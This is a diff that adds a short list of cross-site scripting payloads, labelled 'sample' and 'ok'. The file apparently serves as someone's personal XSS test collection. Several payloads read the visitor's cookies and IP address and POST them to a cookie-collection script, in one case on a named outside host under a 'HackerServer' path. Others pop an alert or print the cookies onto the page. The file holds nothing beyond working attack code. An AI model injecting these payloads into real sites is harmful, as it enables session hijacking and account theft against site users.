@@ -1,0 +1,44 @@
+//sample 
+<script type="text/javascript" src="https://l2.io/ip.js?var=userip">
+	var userip;
+</script>
+<script>
+	var data = new FormData();
+	data.append('ip', userip);
+	data.append('cookie', document.cookie);
+	var x = new XMLHttpRequest();
+	x.open( "POST", "URL.../xss_getcookie_to_db.php", true);
+	x.send(data);
+	document.write(x.responseText);
+</script>
+
+//ok
+<script type="text/javascript" src="https://l2.io/ip.js?var=userip">
+	var userip;
+</script>
+<script>
+	var data = new FormData();
+	data.append('ip', userip);
+	data.append('cookie', document.cookie);
+	var x = new XMLHttpRequest();
+	x.open( "POST", "http://demonickrace.webuda.com/XSS_Test/HackerServer/xss_getcookie_to_db.php", true);
+	x.send(data);
+</script>
+
+//ok
+<script type="text/javascript" src="https://l2.io/ip.js?var=userip">
+  var userip;
+</script>
+<script>
+    document.write("ip = " + userip);
+</script>
+
+//ok
+<script>
+	alert("xss attack!");
+</script>
+
+//ok
+<script>
+	document.write(document.cookie);
+</script>
